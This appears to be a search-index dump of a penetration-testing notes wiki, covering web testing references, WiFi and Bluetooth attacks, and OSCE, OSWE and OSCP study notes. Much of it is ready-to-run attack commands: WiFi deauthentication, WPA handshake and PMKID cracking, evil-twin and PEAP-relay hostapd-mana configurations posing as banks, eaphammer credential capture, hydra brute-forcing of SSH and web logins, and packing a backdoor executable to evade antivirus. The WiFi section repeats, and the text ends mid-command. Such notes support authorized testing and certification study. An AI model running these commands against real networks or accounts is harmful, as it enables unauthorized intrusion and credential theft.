- 006 \u2013 Test HTTP Methods * OTG - CRYPST - 001 - Testing for Weak SSL / TLS Ciphers , Insufficient Transport Layer Protection * OTG - CRYPST - 002 - Testing for Padding Oracle * OTG - ERR - 001 - Testing for Error Code * OTG - ERR - 002 \u2013 Testing for Stack Traces * OTG - INFO - 002 \u2013 Fingerprinting the Webserver * OTG - INPVAL - 001 - Testing for Reflected Cross site scripting * OTG - INPVAL - 002 - Testing for Stored Cross site scripting * OTG - INPVAL - 003 \u2013 HTTP Verb Tampering * OTG - SESS - 001 - Testing for Session Management Schema * OTG - SESS - 002 \u2013 Cookie Attributes Hawkeye - Project security, vulnerability and general risk highlighting tool: https://github.com/hawkeyesec/scanner-cli Adobe Experience Manager (AEM) hacker toolset: https://github.com/0ang3el/aem-hacker","title":"Tools"},{"location":"web/#practice","text":"https://www.owasp.org/index.php/OWASP_Hacking_Lab http://www.dvwa.co.uk/ http://www.itsecgames.com/ Damn Vulnerable Serverless Application: https://www.owasp.org/index.php/OWASP_DVSA https://serverlessrepo.aws.amazon.com/applications/arn:aws:serverlessrepo:us-east-1:889485553959:applications~DVSA","title":"Practice"},{"location":"web/#pending-references","text":"Breaking Parser Logic!: https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf A Fresh Look On Reverse Proxy Related Attacks: https://www.acunetix.com/blog/articles/a-fresh-look-on-reverse-proxy-related-attacks/","title":"Pending References"},{"location":"wifi/","text":"WiFi Wireless Wifi Ref https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9 https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38 https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d https://digitalsilence.com/5ghz-electronic-warfare-part-1-attacking-802-11n-networks/ https://digitalsilence.com/bypassing-port-security-in-2018-defeating-macsec-and-802-1x-2010/ Tools Airgeddon: https://github.com/v1s1t0r1sh3r3/airgeddon wifite2 - Attack multiple WEP and WPA encrypted networks at the same time: https://github.com/derv82/wifite2 WIFIPhisher - Phishing attack tool for Wifi networks: https://github.com/wifiphisher/wifiphisher WiFi Wardriving with Android - WiGLE WiFi Wardriving: https://play.google.com/store/apps/details?id=net.wigle.wigleandroid hl=en inSSIDer is a wireless network scanner. It was meant to replace NetStumbler, which was a Microsoft Windows Wi-Fi scanner. Network Watcher by NirSoft - displays the list of all computers and devices that are connected to the same network Quick Reference iwconfig interfaces: iw dev networks: iw list change to monitor mode: iw dev wlan0 set monitor none deauth: \u200b aireplay - ng - 0 100 - a D2 : E9 : 6 A : D3 : B3 : 50 wlan0 capture: airodump - ng wlan0 - c 6 airodump - ng wlan0 - c 6 - w capture crack: \u200b aircrack - ng - w wordlists / 100 - common - passwords . txt capture - 01 . cap get IP after connecting: dhclient - v wlan1 ssh: hydra - t 4 - l root - P / root / wordlists / 100 - common - passwords . txt ssh : // 192 . 105 . 16 . 4 iwlist wlan0 scan nmcli dev wifi nmcli dev wifi connect AP - SSID password APpassword airmon - ng start | stop | restart interface wpa_supplicant - Dnl80211 - iwlan1 - c supplicant . conf network = { ssid = example scan_ssid = 1 key_mgmt = WPA - PSK psk = example } network = { ssid = Corporate-A scan_ssid = 1 key_mgmt = WPA - EAP eap = PEAP identity = bob password = hello phase1 = peaplabel=0 phase2 = auth=MSCHAPV2 } network = { ssid = Corporate-A scan_ssid = 1 key_mgmt = WPA - EAP eap = PEAP identity = bob password = hello phase1 = peaplabel=0 phase2 = auth=GTC } network = { ssid = Corporate-A scan_ssid = 1 key_mgmt = WPA - EAP eap = TTLS identity = bob anonymous_identity = anon password = hello phase2 = auth=PAP } network = { ssid = Corporate-A scan_ssid = 1 key_mgmt = WPA - EAP eap = TTLS identity = bob anonymous_identity = anon password = hello phase2 = auth=CHAP } network = { ssid = Corporate-A scan_ssid = 1 key_mgmt = WPA - EAP eap = TTLS identity = bob anonymous_identity = anon password = hello phase2 = auth=MSCHAPV2 } network = { ssid = NextGenNetwork psk = welcome1 key_mgmt = SAE } network = { ssid = Secure-Public-WiFi key_mgmt = OWE } mac: macchanger - m D2 : E9 : 6 A : D3 : B3 : 51 wlan1 Capture and crack handshake: aircrack - ng captured . cap \u200b aircrack - ng - a 2 - b BSSID - w wordlist captured . cap \u200b WPA/WPA2 PMKID STEP 1: https://github.com/ZerBea/hcxdumptool https://github.com/aircrack-ng/aircrack-ng STEP 2: Find target BSSID: airodump - ng --band abg wlan0 airodump - ng int airdump - ng wlan0 - c 1 STEP 3: Add BSSID in \u2018bssid.txt\u2019 and use \u2018hcxdumptool\u2019: hcxdumptool - i int --filterlist=bssid.txt --filermode=2 --enable_status=2 -o pmkid.pcap STEP 4: Extract PMKID into hashcat format for cracking: hcxpcaptool - z wpa2_pmkid_hash . txt pmkid . pcap STEP 5: Crack: hashcat - a 0 - m 16800 - w 4 wpa2_pmkid_hash . txt dict . txt https://mobile.twitter.com/netmux/status/1097908867374215168 WPA enterprise (evil tween attack) https://pwn.no0.be/exploitation/wifi/wpa_enterprise/ https://rootsh3ll.com/evil-twin-attack/ 4 way handshake capture: sudo bettercap -iface wlan0 this will set the interface in monitor mode and start channel hopping on all supported frequencies: wifi . recon on we want our APs sorted by number of clients for this attack, the default sorting would be rssi asc : set wifi.show.sort clients desc every second, clear our view and present an updated list of nearby WiFi networks set ticker.commands clear; wifi.show ticker on other wifi.recon.channel 1 wifi.deauth e0:xx:xx:xx:xx:xx Cracking 4-way handshake: /path/to/cap2hccapx /root/bettercap-wifi-handshakes.pcap bettercap-wifi-handshakes.hccapx /path/to/hashcat -m2500 -a3 -w3 bettercap-wifi-handshakes.hccapx ?d?d?d?d?d?d?d?d Client-less PMKID Attack https://hashcat.net/forum/thread-7717.html PMKID = HMAC-SHA1-128(PMK, \"PMK Name\" | MAC_AP | MAC_STA) # wifi.assoc supports all (or `*`) or a specific BSSID, just like wifi.deauth wifi.assoc all All nearby vulnerable routers (and let me reiterate: a lot of them are vulnerable), will start sending you the PMKID, which bettercap will dump to the usual pcap file: PMKID Cracking /path/to/hcxpcaptool -z bettercap-wifi-handshakes.pmkid /root/bettercap-wifi-handshakes.pcap /path/to/hashcat -m16800 -a3 -w3 bettercap-wifi-handshakes.pmkid ?d?d?d?d?d?d?d?d Evil Tween . / eaphammer - i wlan1 --channel 6 --auth wpa-eap --essid RoyalBank --creds . / eaphammer - i wlan1 --channel 6 --auth wpa-eap --essid GlobalMarineServices --creds Honeypot (hostapd): hostapd honeypot . conf interface = wlan1 hw_mode = g channel = 6 driver = nl80211 ssid = XYCompany auth_algs = 1 wpa = 2 wpa_key_mgmt = WPA - PSK wpa_pairwise = CCMP wpa_passphrase = raspberry @1 # SSID 1 interface = wlan1 driver = nl80211 ssid = dex - net wpa = 2 wpa_passphrase = 123456789 wpa_key_mgmt = WPA - PSK rsn_pairwise = CCMP channel = 1 # SSID 2 bss = wlan1_0 ssid = dex - network wpa = 2 wpa_passphrase = 123456789 wpa_key_mgmt = WPA - PSK rsn_pairwise = CCMP channel = 1 interface = wlan1 ssid = SecureNetwork hw_mode = g channel = 1 wpa = 2 wpa_passphrase = thanks @123 # wpa_key_mgmt = SAE rsn_pairwise = CCMP interface = wlan1 ssid = SecureNetwork hw_mode = g channel = 1 wpa = 2 wpa_key_mgmt = OWE rsn_pairwise = CCMP # Evil Twin - WPA Enterprise interface = wlan1 ssid = TigerSecurities channel = 6 hw_mode = g wpa = 3 wpa_key_mgmt = WPA - EAP wpa_pairwise = TKIP CCMP auth_algs = 3 ieee8021x = 1 eapol_key_index_workaround = 0 eap_server = 1 eap_user_file = hostapd . eap_user ca_cert =/ root / certs / ca . pem server_cert =/ root / certs / server . pem # PEAP relay attack using Hostapd - mana interface = wlan0 ssid = GlobalCentralBank channel = 6 hw_mode = g wpa = 3 wpa_key_mgmt = WPA - EAP wpa_pairwise = TKIP CCMP auth_algs = 3 ieee8021x = 1 eapol_key_index_workaround = 0 eap_server = 1 eap_user_file = hostapd . eap_user ca_cert =/ root / certs / ca . pem server_cert =/ root / certs / server . pem private_key =/ root / certs / server . key private_key_passwd = dh_file =/ root / certs / dhparam . pem mana_wpe = 1 mana_eapsuccess = 1 enable_mana = 1 enable_sycophant = 1 sycophant_dir =/ tmp / References New References Tracking All the WiFi Things: https://osintcurio.us/2019/01/15/tracking-all-the-wifi-things/ How to Make a Captive Portal of Death: https://medium.com/bugbountywriteup/how-to-make-a-captive-portal-of-death-48e82a1d81a Bluetooth Quick References apt - get install bluez hciconfig - similarly to ifconfig hciconfig hci0 up hcitool - provide us with device name, device ID, device class, and device clock information hcitool scan hcitool inq - MAC addresses of the devices, the clock offset, and the class of the devices. https://www.bluetooth.org/en-us/specification/assigned-numbers/service-discovery hcidump - sniff the Bluetooth communication Service Discovery Protocol (SDP) is a Bluetooth protocol for searching for Bluetooth services (Bluetooth is suite of services), sdptool browse MACaddress Check reachability: l2ping MACaddress","title":"WiFi & Wireless"},{"location":"wifi/#wifi-wireless","text":"","title":"WiFi &amp; Wireless"},{"location":"wifi/#wifi","text":"","title":"Wifi"},{"location":"wifi/#ref","text":"https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9 https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38 https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d https://digitalsilence.com/5ghz-electronic-warfare-part-1-attacking-802-11n-networks/ https://digitalsilence.com/bypassing-port-security-in-2018-defeating-macsec-and-802-1x-2010/","title":"Ref"},{"location":"wifi/#tools","text":"Airgeddon: https://github.com/v1s1t0r1sh3r3/airgeddon wifite2 - Attack multiple WEP and WPA encrypted networks at the same time: https://github.com/derv82/wifite2 WIFIPhisher - Phishing attack tool for Wifi networks: https://github.com/wifiphisher/wifiphisher WiFi Wardriving with Android - WiGLE WiFi Wardriving: https://play.google.com/store/apps/details?id=net.wigle.wigleandroid hl=en inSSIDer is a wireless network scanner. It was meant to replace NetStumbler, which was a Microsoft Windows Wi-Fi scanner. Network Watcher by NirSoft - displays the list of all computers and devices that are connected to the same network","title":"Tools"},{"location":"wifi/#quick-reference","text":"iwconfig interfaces: iw dev networks: iw list change to monitor mode: iw dev wlan0 set monitor none deauth: \u200b aireplay - ng - 0 100 - a D2 : E9 : 6 A : D3 : B3 : 50 wlan0 capture: airodump - ng wlan0 - c 6 airodump - ng wlan0 - c 6 - w capture crack: \u200b aircrack - ng - w wordlists / 100 - common - passwords . txt capture - 01 . cap get IP after connecting: dhclient - v wlan1 ssh: hydra - t 4 - l root - P / root / wordlists / 100 - common - passwords . txt ssh : // 192 . 105 . 16 . 4 iwlist wlan0 scan nmcli dev wifi nmcli dev wifi connect AP - SSID password APpassword airmon - ng start | stop | restart interface wpa_supplicant - Dnl80211 - iwlan1 - c supplicant . conf network = { ssid = example scan_ssid = 1 key_mgmt = WPA - PSK psk = example } network = { ssid = Corporate-A scan_ssid = 1 key_mgmt = WPA - EAP eap = PEAP identity = bob password = hello phase1 = peaplabel=0 phase2 = auth=MSCHAPV2 } network = { ssid = Corporate-A scan_ssid = 1 key_mgmt = WPA - EAP eap = PEAP identity = bob password = hello phase1 = peaplabel=0 phase2 = auth=GTC } network = { ssid = Corporate-A scan_ssid = 1 key_mgmt = WPA - EAP eap = TTLS identity = bob anonymous_identity = anon password = hello phase2 = auth=PAP } network = { ssid = Corporate-A scan_ssid = 1 key_mgmt = WPA - EAP eap = TTLS identity = bob anonymous_identity = anon password = hello phase2 = auth=CHAP } network = { ssid = Corporate-A scan_ssid = 1 key_mgmt = WPA - EAP eap = TTLS identity = bob anonymous_identity = anon password = hello phase2 = auth=MSCHAPV2 } network = { ssid = NextGenNetwork psk = welcome1 key_mgmt = SAE } network = { ssid = Secure-Public-WiFi key_mgmt = OWE } mac: macchanger - m D2 : E9 : 6 A : D3 : B3 : 51 wlan1 Capture and crack handshake: aircrack - ng captured . cap \u200b aircrack - ng - a 2 - b BSSID - w wordlist captured . cap \u200b WPA/WPA2 PMKID STEP 1: https://github.com/ZerBea/hcxdumptool https://github.com/aircrack-ng/aircrack-ng STEP 2: Find target BSSID: airodump - ng --band abg wlan0 airodump - ng int airdump - ng wlan0 - c 1 STEP 3: Add BSSID in \u2018bssid.txt\u2019 and use \u2018hcxdumptool\u2019: hcxdumptool - i int --filterlist=bssid.txt --filermode=2 --enable_status=2 -o pmkid.pcap STEP 4: Extract PMKID into hashcat format for cracking: hcxpcaptool - z wpa2_pmkid_hash . txt pmkid . pcap STEP 5: Crack: hashcat - a 0 - m 16800 - w 4 wpa2_pmkid_hash . txt dict . txt https://mobile.twitter.com/netmux/status/1097908867374215168 WPA enterprise (evil tween attack) https://pwn.no0.be/exploitation/wifi/wpa_enterprise/ https://rootsh3ll.com/evil-twin-attack/ 4 way handshake capture: sudo bettercap -iface wlan0 this will set the interface in monitor mode and start channel hopping on all supported frequencies: wifi . recon on we want our APs sorted by number of clients for this attack, the default sorting would be rssi asc : set wifi.show.sort clients desc every second, clear our view and present an updated list of nearby WiFi networks set ticker.commands clear; wifi.show ticker on other wifi.recon.channel 1 wifi.deauth e0:xx:xx:xx:xx:xx Cracking 4-way handshake: /path/to/cap2hccapx /root/bettercap-wifi-handshakes.pcap bettercap-wifi-handshakes.hccapx /path/to/hashcat -m2500 -a3 -w3 bettercap-wifi-handshakes.hccapx ?d?d?d?d?d?d?d?d Client-less PMKID Attack https://hashcat.net/forum/thread-7717.html PMKID = HMAC-SHA1-128(PMK, \"PMK Name\" | MAC_AP | MAC_STA) # wifi.assoc supports all (or `*`) or a specific BSSID, just like wifi.deauth wifi.assoc all All nearby vulnerable routers (and let me reiterate: a lot of them are vulnerable), will start sending you the PMKID, which bettercap will dump to the usual pcap file: PMKID Cracking /path/to/hcxpcaptool -z bettercap-wifi-handshakes.pmkid /root/bettercap-wifi-handshakes.pcap /path/to/hashcat -m16800 -a3 -w3 bettercap-wifi-handshakes.pmkid ?d?d?d?d?d?d?d?d Evil Tween . / eaphammer - i wlan1 --channel 6 --auth wpa-eap --essid RoyalBank --creds . / eaphammer - i wlan1 --channel 6 --auth wpa-eap --essid GlobalMarineServices --creds Honeypot (hostapd): hostapd honeypot . conf interface = wlan1 hw_mode = g channel = 6 driver = nl80211 ssid = XYCompany auth_algs = 1 wpa = 2 wpa_key_mgmt = WPA - PSK wpa_pairwise = CCMP wpa_passphrase = raspberry @1 # SSID 1 interface = wlan1 driver = nl80211 ssid = dex - net wpa = 2 wpa_passphrase = 123456789 wpa_key_mgmt = WPA - PSK rsn_pairwise = CCMP channel = 1 # SSID 2 bss = wlan1_0 ssid = dex - network wpa = 2 wpa_passphrase = 123456789 wpa_key_mgmt = WPA - PSK rsn_pairwise = CCMP channel = 1 interface = wlan1 ssid = SecureNetwork hw_mode = g channel = 1 wpa = 2 wpa_passphrase = thanks @123 # wpa_key_mgmt = SAE rsn_pairwise = CCMP interface = wlan1 ssid = SecureNetwork hw_mode = g channel = 1 wpa = 2 wpa_key_mgmt = OWE rsn_pairwise = CCMP # Evil Twin - WPA Enterprise interface = wlan1 ssid = TigerSecurities channel = 6 hw_mode = g wpa = 3 wpa_key_mgmt = WPA - EAP wpa_pairwise = TKIP CCMP auth_algs = 3 ieee8021x = 1 eapol_key_index_workaround = 0 eap_server = 1 eap_user_file = hostapd . eap_user ca_cert =/ root / certs / ca . pem server_cert =/ root / certs / server . pem # PEAP relay attack using Hostapd - mana interface = wlan0 ssid = GlobalCentralBank channel = 6 hw_mode = g wpa = 3 wpa_key_mgmt = WPA - EAP wpa_pairwise = TKIP CCMP auth_algs = 3 ieee8021x = 1 eapol_key_index_workaround = 0 eap_server = 1 eap_user_file = hostapd . eap_user ca_cert =/ root / certs / ca . pem server_cert =/ root / certs / server . pem private_key =/ root / certs / server . key private_key_passwd = dh_file =/ root / certs / dhparam . pem mana_wpe = 1 mana_eapsuccess = 1 enable_mana = 1 enable_sycophant = 1 sycophant_dir =/ tmp /","title":"Quick Reference"},{"location":"wifi/#references","text":"New References Tracking All the WiFi Things: https://osintcurio.us/2019/01/15/tracking-all-the-wifi-things/ How to Make a Captive Portal of Death: https://medium.com/bugbountywriteup/how-to-make-a-captive-portal-of-death-48e82a1d81a","title":"References"},{"location":"wifi/#bluetooth","text":"","title":"Bluetooth"},{"location":"wifi/#quick-references","text":"apt - get install bluez hciconfig - similarly to ifconfig hciconfig hci0 up hcitool - provide us with device name, device ID, device class, and device clock information hcitool scan hcitool inq - MAC addresses of the devices, the clock offset, and the class of the devices. https://www.bluetooth.org/en-us/specification/assigned-numbers/service-discovery hcidump - sniff the Bluetooth communication Service Discovery Protocol (SDP) is a Bluetooth protocol for searching for Bluetooth services (Bluetooth is suite of services), sdptool browse MACaddress Check reachability: l2ping MACaddress","title":"Quick References"},{"location":"certifications/cissp/","text":"CISSP","title":"CISSP"},{"location":"certifications/cissp/#cissp","text":"","title":"CISSP"},{"location":"certifications/osce/","text":"OSCE New References https://tulpa-security.com/2017/07/18/288/ https://m101.github.io/binholic/2018/04/28/yet-another-osce-review.html https://github.com/FabioBaroni/awesome-exploit-development Summarized References https://aminbohio.com/study-guide-tips-offensive-security-certified-expert-osce-cracking-the-perimeter-ctp/ Tools Olly Debugger WinDBG Immunity Debugger with Mona CFF Explorer LordPE DevCPP nasm VulnServer Training Open Security Training Introductory Intel x86: Architecture, Assembly, Applications, Alliteration Introduction To Software Exploits Exploits 2: Exploitation in the Windows Environment Exploit development Corelan Exploit Writing Tutorial Series Exploit Writing Tutorial Part 1 \u2013 Stack Based Overflows Buffer Overflows in the Microsoft Windows\u00ae Environment Basic Reverse Engineering with Immunity Debugger Egg hunting \"Safely Searching Process Virtual Address Space\" By Skape Egg Hunters \u2013 Fuzzy Security Egg Hunters \u2013 A Twist In Buffer Overflows Fuzzing 15 Minute Guide To Fuzzing SkyDogCon 2015: Fuzzing Basics \u2013 Scott M An Introduction to Fuzzing: Using fuzzers (SPIKE) to find vulnerabilities Practice Vulnserver \u2013 Fuzzing with Spike Bypassing exploit mitigation: Bypassing ASLR/DEP Exploit writing tutorial part 6 : Bypassing Stack Cookies, SafeSeh, SEHOP, HW DEP and ASLR Exploit Dev 101: Bypassing ASLR on Windows Bypassing ASLR and DEP on Windows 7: The Audio Converter Case Shellcoding: Exploit Writing Tutorial Part 9 \u2013 Introduction To Win32 Shellcoding ShellCode By Hand http://security.cs.rpi.edu/courses/binexp-spring2015/lectures/7/05_lecture.pdf http://sh3llc0d3r.com/windows-reverse-shell-shellcode-i/ Web app security Web Application Pentesting \u2013 Webpwnized File Inclusion Vulnerabilities Guide Book on Cross Site Scripting Finding vulnerabilities in Web Applications AV evasion: https://resources.infosecinstitute.com/bypassing-antivirus/ https://www.youtube.com/watch?v=tBY46vs0ptE https://dl.packetstormsecurity.net/papers/bypass/bypassing-av.pdf https://pentest.blog/art-of-anti-detection-1-introduction-to-av-detection-techniques/ Practice VulnServer Walk-throughs TRUN GMON HTER KSTET CTF CTP Registration: http://fc4.me/","title":"OSCE"},{"location":"certifications/osce/#osce","text":"","title":"OSCE"},{"location":"certifications/osce/#new-references","text":"https://tulpa-security.com/2017/07/18/288/ https://m101.github.io/binholic/2018/04/28/yet-another-osce-review.html https://github.com/FabioBaroni/awesome-exploit-development","title":"New References"},{"location":"certifications/osce/#summarized-references","text":"https://aminbohio.com/study-guide-tips-offensive-security-certified-expert-osce-cracking-the-perimeter-ctp/","title":"Summarized References"},{"location":"certifications/osce/#tools","text":"Olly Debugger WinDBG Immunity Debugger with Mona CFF Explorer LordPE DevCPP nasm VulnServer","title":"Tools"},{"location":"certifications/osce/#training","text":"","title":"Training"},{"location":"certifications/osce/#open-security-training","text":"Introductory Intel x86: Architecture, Assembly, Applications, Alliteration Introduction To Software Exploits Exploits 2: Exploitation in the Windows Environment","title":"Open Security Training"},{"location":"certifications/osce/#exploit-development","text":"Corelan Exploit Writing Tutorial Series Exploit Writing Tutorial Part 1 \u2013 Stack Based Overflows Buffer Overflows in the Microsoft Windows\u00ae Environment Basic Reverse Engineering with Immunity Debugger","title":"Exploit development"},{"location":"certifications/osce/#egg-hunting","text":"\"Safely Searching Process Virtual Address Space\" By Skape Egg Hunters \u2013 Fuzzy Security Egg Hunters \u2013 A Twist In Buffer Overflows","title":"Egg hunting"},{"location":"certifications/osce/#fuzzing","text":"15 Minute Guide To Fuzzing SkyDogCon 2015: Fuzzing Basics \u2013 Scott M An Introduction to Fuzzing: Using fuzzers (SPIKE) to find vulnerabilities","title":"Fuzzing"},{"location":"certifications/osce/#practice","text":"Vulnserver \u2013 Fuzzing with Spike","title":"Practice"},{"location":"certifications/osce/#bypassing-exploit-mitigation","text":"Bypassing ASLR/DEP Exploit writing tutorial part 6 : Bypassing Stack Cookies, SafeSeh, SEHOP, HW DEP and ASLR Exploit Dev 101: Bypassing ASLR on Windows Bypassing ASLR and DEP on Windows 7: The Audio Converter Case","title":"Bypassing exploit mitigation:"},{"location":"certifications/osce/#shellcoding","text":"Exploit Writing Tutorial Part 9 \u2013 Introduction To Win32 Shellcoding ShellCode By Hand http://security.cs.rpi.edu/courses/binexp-spring2015/lectures/7/05_lecture.pdf http://sh3llc0d3r.com/windows-reverse-shell-shellcode-i/","title":"Shellcoding:"},{"location":"certifications/osce/#web-app-security","text":"Web Application Pentesting \u2013 Webpwnized File Inclusion Vulnerabilities Guide Book on Cross Site Scripting Finding vulnerabilities in Web Applications","title":"Web  app security"},{"location":"certifications/osce/#av-evasion","text":"https://resources.infosecinstitute.com/bypassing-antivirus/ https://www.youtube.com/watch?v=tBY46vs0ptE https://dl.packetstormsecurity.net/papers/bypass/bypassing-av.pdf https://pentest.blog/art-of-anti-detection-1-introduction-to-av-detection-techniques/","title":"AV evasion:"},{"location":"certifications/osce/#practice_1","text":"","title":"Practice"},{"location":"certifications/osce/#vulnserver-walk-throughs","text":"TRUN GMON HTER KSTET","title":"VulnServer Walk-throughs"},{"location":"certifications/osce/#ctf","text":"CTP Registration: http://fc4.me/","title":"CTF"},{"location":"certifications/oswe/","text":"SQLi Look fir \"query\", \"search\", \"sql\" Enable database logs to check for queries with input data Extract data / structure Exec code Blind Substring + Ascii Like based match XSS Cookie extraction CSRF bypass XXE Important functions Login / registration Forgot password / recovery Attachments / file uploads Review Identify publicly accessible pages for initial attack Identify interesting high privileged actions for secondary attack Try default passwords (admin:admin admin:password) When Base64 (or similar encoded) value is observed, decode and check. User provided XML, JSON, Pickle is processed Check for locations that reflect values in XML/JSON Deserialization vulnerabilities Parser related issues XXE JSON https://www.newtonsoft.com/json Break the syntax to see parser errors When a hash values is observed check if it can be broken based on online search (admin:admin) Look for file with \"credential\" \"password\" \"key\" in it. Look for configuration files like: FileZilla Server.xml wp-config.php /etc/hosts - for custom mappings ifconfig - for other interfaces Look at logs /var/log/auth.log","title":"Oswe"},{"location":"certifications/oscp/0-cheatsheet/","text":"Enumeration TCP nmap - sS - sV - sC - n [ IP ] nmap - vv - Pn - A - sC - sS - T 4 - p - 10 . 0 . 0 . 1 UDP nmap - sU - sV - n --top-ports 200 [IP] SNMP (UDP 161) snmp - check - t [ IP ] - c public SMTP nmap \u2013 script = smtp - commands , smtp - enum - users , smtp - vuln - cve2010 - 4344 , smtp - vuln - cve2011 - 1720 , smtp - vuln - cve2011 - 1764 - p 25 10 . 0 . 0 . 1 SNMP snmpwalk - c public - v1 10 . 0 . 0 . 0 SMB (TCP 139/TCP 445) enum4linux [ IP ] WebDav davtest - url http ( s ) : //[ IP ] FTP: ftp [ IP ] Username : anonymous Password : anonymous nmap \u2013 script = ftp - anon , ftp - bounce , ftp - libopie , ftp - proftpd - backdoor , ftp - vsftpd - backdoor , ftp - vuln - cve2010 - 4221 , tftp - enum - p 21 10 . 0 . 0 . 1 SMB (anonymous) smbclient - L \\\\ [ IP ] Username : root Password : None enum4linux 10.0.0.1 nmap \u2013 script = smb - enum - domains . nse , smb - enum - groups . nse , smb - enum - processes . nse , smb - enum - sessions . nse , smb - enum - shares . nse , smb - enum - users . nse , smb - ls . nse , smb - mbenum . nse , smb - os - discovery . nse , smb - print - text . nse , smb - psexec . nse , smb - security - mode . nse , smb - server - stats . nse , smb - system - info . nse , smb - vuln - conficker . nse , smb - vuln - cve2009 - 3103 . nse , smb - vuln - ms06 - 025 . nse , smb - vuln - ms07 - 029 . nse , smb - vuln - ms08 - 067 . nse , smb - vuln - ms10 - 054 . nse , smb - vuln - ms10 - 061 . nse , smb - vuln - regsvc - dos . nse , smbv2 - enabled . nse 10 . 0 . 0 . 1 MySQL nmap - sV - Pn - vv \u2013 script = mysql - audit , mysql - databases , mysql - dump - hashes , mysql - empty - password , mysql - enum , mysql - info , mysql - query , mysql - users , mysql - variables , mysql - vuln - cve2012 - 2122 10 . 0 . 0 . 1 - p 3306 Web Applications Structure Discovery dirb http : // 10 . 0 . 0 . 1 / usr / share / wordlists / dirb / common . txt Vulnerability Discovery nikto - h http ( s ) : //[ IP ] : [ PORT ]/[ DIRECTORY ] Password Attacks https://hashkiller.co.uk john hashes . txt hashcat - m 500 - a 0 - o output . txt \u2013 remove hashes . txt / usr / share / wordlists / rockyou . txt hydra 10 . 0 . 0 . 1 http - post - form \u201c / admin . php : target = auth mode = login user =^ USER ^ password =^ PASS ^ : invalid \u201d - P / usr / share / wordlists / rockyou . txt - l admin hydra - l admin - P / usr / share / wordlists / rockyou . txt - o results . txt ssh : // 10 . 0 . 0 . 1 Tunneling Tunnels traffic through 10.0.0.1 and makes a route for all traffic destined for 10.10.10.0/24 through your sshuttle tunnel. sshuttle - r root @10.0.0.1 10.10.10.0 / 24 sshuttle - l ( any port ) - r root @10.10.0.1 10.10.0.0 / 24 AV Bypassing root @kali : ~/ Hyperion - 1.0 # wine hyperion . exe .. / backdoor . exe .. / backdoor_mutation . exe https://github.com/furrukhtaj/Enumerator Scripts from awansec https://awansec.com/oscp-review.html","title":"Enumeration"},{"location":"certifications/oscp/0-cheatsheet/#enumeration","text":"","title":"Enumeration"},{"location":"certifications/oscp/0-cheatsheet/#tcp","text":"nmap - sS - sV - sC - n [ IP ] nmap - vv - Pn - A - sC - sS - T 4 - p - 10 . 0 . 0 . 1","title":"TCP"},{"location":"certifications/oscp/0-cheatsheet/#udp","text":"nmap - sU - sV - n --top-ports 200 [IP]","title":"UDP"},{"location":"certifications/oscp/0-cheatsheet/#snmp-udp-161","text":"snmp - check - t [ IP ] - c public","title":"SNMP (UDP 161)"},{"location":"certifications/oscp/0-cheatsheet/#smtp","text":"nmap \u2013 script = smtp - commands , smtp - enum - users , smtp - vuln - cve2010 - 4344 , smtp - vuln - cve2011 - 1720 , smtp - vuln - cve2011 - 1764 - p 25 10 . 0 . 0 . 1","title":"SMTP"},{"location":"certifications/oscp/0-cheatsheet/#snmp","text":"snmpwalk - c public - v1 10 . 0 . 0 . 0","title":"SNMP"},{"location":"certifications/oscp/0-cheatsheet/#smb-tcp-139tcp-445","text":"enum4linux [ IP ]","title":"SMB (TCP 139/TCP 445)"},{"location":"certifications/oscp/0-cheatsheet/#webdav","text":"davtest - url http ( s ) : //[ IP ]","title":"WebDav"},{"location":"certifications/oscp/0-cheatsheet/#ftp","text":"ftp [ IP ] Username : anonymous Password : anonymous nmap \u2013 script = ftp - anon , ftp - bounce , ftp - libopie , ftp - proftpd - backdoor , ftp - vsftpd - backdoor , ftp - vuln - cve2010 - 4221 , tftp - enum - p 21 10 . 0 . 0 . 1","title":"FTP:"},{"location":"certifications/oscp/0-cheatsheet/#smb-anonymous","text":"smbclient - L \\\\ [ IP ] Username : root Password : None enum4linux 10.0.0.1 nmap \u2013 script = smb - enum - domains . nse , smb - enum - groups . nse , smb - enum - processes . nse , smb - enum - sessions . nse , smb - enum - shares . nse , smb - enum - users . nse , smb - ls . nse , smb - mbenum . nse , smb - os - discovery . nse , smb - print - text . nse , smb - psexec . nse , smb - security - mode . nse , smb - server - stats . nse , smb - system - info . nse , smb - vuln - conficker . nse , smb - vuln - cve2009 - 3103 . nse , smb - vuln - ms06 - 025 . nse , smb - vuln - ms07 - 029 . nse , smb - vuln - ms08 - 067 . nse , smb - vuln - ms10 - 054 . nse , smb - vuln - ms10 - 061 . nse , smb - vuln - regsvc - dos . nse , smbv2 - enabled . nse 10 . 0 . 0 . 1","title":"SMB (anonymous)"},{"location":"certifications/oscp/0-cheatsheet/#mysql","text":"nmap - sV - Pn - vv \u2013 script = mysql - audit , mysql - databases , mysql - dump - hashes , mysql - empty - password , mysql - enum , mysql - info , mysql - query , mysql - users , mysql - variables , mysql - vuln - cve2012 - 2122 10 . 0 . 0 . 1 - p 3306","title":"MySQL"},{"location":"certifications/oscp/0-cheatsheet/#web-applications","text":"","title":"Web Applications"},{"location":"certifications/oscp/0-cheatsheet/#structure-discovery","text":"dirb http : // 10 . 0 . 0 . 1 / usr / share / wordlists / dirb / common . txt","title":"Structure Discovery"},{"location":"certifications/oscp/0-cheatsheet/#vulnerability-discovery","text":"nikto - h http ( s ) : //[ IP ] : [ PORT ]/[ DIRECTORY ]","title":"Vulnerability Discovery"},{"location":"certifications/oscp/0-cheatsheet/#password-attacks","text":"https://hashkiller.co.uk john hashes . txt hashcat - m 500 - a 0 - o output . txt \u2013 remove hashes . txt / usr / share / wordlists / rockyou . txt hydra 10 . 0 . 